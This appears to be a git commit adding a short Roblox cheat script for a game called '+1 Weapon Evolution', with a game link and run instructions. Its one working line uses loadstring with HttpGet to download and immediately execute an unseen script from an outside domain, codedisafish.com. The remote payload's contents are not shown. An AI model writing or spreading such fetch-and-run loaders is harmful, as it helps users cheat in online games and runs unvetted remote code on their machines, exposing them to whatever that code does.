241a1d19fc963434e55486ef0c235308fd82a051
coded <urmcoded@outlook.com>
2026-06-28 20:11:07 +0100

    ok
    ok

---
+++ +1 Weapon Evolution.lua
@@ -0,0 +1,5 @@
+-- https://www.roblox.com/share?code=6b991636f260b640b11433d374dde7e6&type=ExperienceDetails&stamp=1782673672122 -- Game Link ^^
+
+-- Run AS you join the game, do not move, if you have moved; respawn.
+
+loadstring(game:HttpGet("https://codedisafish.com/scripts/script4.lua"))(); -- Has Auto Walk, you don't need to move yourself
